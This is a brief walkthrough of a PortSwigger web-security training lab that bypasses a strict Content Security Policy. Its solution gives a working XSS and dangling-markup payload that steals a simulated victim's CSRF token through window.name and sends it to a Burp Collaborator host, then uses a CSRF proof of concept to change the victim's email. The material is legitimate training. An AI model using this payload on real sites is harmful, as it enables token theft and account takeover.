----

### Lab description

This lab using a strict CSP that blocks outgoing requests to external web sites.

To solve the lab, first perform a [cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) attack that bypasses the CSP and exfiltrates a simulated victim user's [CSRF](https://portswigger.net/web-security/csrf) token using Burp Collaborator. You then need to change the simulated user's email address to `hacker@evil-user.net`.

You must label your vector with the word "Click" in order to induce the simulated user to click it. For example:

`<a href="">Click me</a>`

You can log in to your own account using the following credentials: `wiener:peter`


### Lab solution

- Login with credencials and send the payload

```
<script> if(window.name) { 
new Image().src='//collab.oastify.com?'+encodeURIComponent(window.name);
} else { location='https://0a8000c704f9b73f81fc752a00f600e7.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://exploit-0a5600150418b7ac819c747701ca0011.exploit-server.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27';}
</script>

```
- Get the CSRF token at burp collaborator
![](/static/img/Pasted_image_20230703091824.png)

- Send the change email account request again, and generate a CSRF POC, like one bellow

![](/static/img/Pasted_image_20230703091807.png)

- LAB will be solved automatically